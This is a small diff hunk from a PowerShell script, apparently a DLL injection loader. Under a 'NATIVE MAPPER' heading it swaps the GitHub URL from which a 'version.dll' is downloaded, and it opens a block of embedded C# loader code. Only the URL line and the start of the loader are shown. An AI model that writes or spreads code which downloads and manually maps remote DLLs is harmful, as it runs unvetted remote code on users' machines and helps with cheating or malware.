@@ -268,7 +268,7 @@ try {
 #  NATIVE MAPPER
 # =============================================================
 
-$dllUrl = "https://raw.githubusercontent.com/RE4PERxAlive/blood-x/refs/heads/main/version.dll"
+$dllUrl = "https://raw.githubusercontent.com/RE4PERxAlive/chudon/refs/heads/main/version.dll"
 
 $loaderCode = @'
 using System;
